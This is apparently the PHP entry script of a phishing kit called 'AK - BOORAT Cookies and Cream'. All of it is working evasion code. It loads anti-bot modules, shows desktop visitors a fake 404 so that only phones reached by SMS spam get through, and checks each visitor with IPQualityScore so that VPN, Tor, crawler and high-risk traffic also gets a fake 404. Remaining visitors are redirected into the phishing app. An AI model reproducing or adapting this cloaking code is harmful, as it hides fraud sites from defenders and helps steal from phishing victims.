<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀  AK - BOORAT⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀   Cookies and Cream⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀  
*/
ob_start();
session_start();
include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include 'settings.php';
include 'algo.php';


function isMobileDevice() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo
|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i"
, $_SERVER["HTTP_USER_AGENT"]);
}

if ($smsspam == 'yes'){
    if(isMobileDevice()){
}
else {
    header('HTTP/1.0 404 Not Found');
                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
    exit();
}
}

$_SESSION["ip"] = clientData('ip');
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/".$ip_protection_api."/".$_SESSION["ip"]."");
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
    curl_setopt($ch,CURLOPT_TIMEOUT,400);
    $json=curl_exec($ch);
$success = trim(strip_tags(get_string_between($json,'success":',',"')));
$isp = trim(strip_tags(get_string_between($json,'"ISP":"','","')));
$proxy = trim(strip_tags(get_string_between($json,'"proxy":',',"')));
$tor = trim(strip_tags(get_string_between($json,'"tor":',',"')));
$vpn = trim(strip_tags(get_string_between($json,'vpn":',',"')));
$is_crawler = trim(strip_tags(get_string_between($json,'is_crawler":',',"')));
$region = trim(strip_tags(get_string_between($json,'region":"','","')));
$city = trim(strip_tags(get_string_between($json,'city":"','","')));
$timezone = trim(strip_tags(get_string_between($json,'timezone":"','","')));
$fraud_score = trim(strip_tags(get_string_between($json,'fraud_score":',',"')));
$_SESSION['ip_city']=$region;
$_SESSION['ip_state']=$city;
$_SESSION['ip_timezone']=$timezone;
if ($ip_protection=="yes") {
if ($fraud_score >= "".$max_fraud_score.""|| $tor == "".$fuck_tor."" || $vpn == "".$fuck_vpn."" || $is_crawler == "".$fuck_crawler."" || $success == "false") {
    exit(header('HTTP/1.0 404 Not Found'));
}
}


if ($CFProtection=="yes") {
exit(header("Location: ./CFProtection/index.php"));
}else{
    exit(header("Location: ./app/index.php"));

}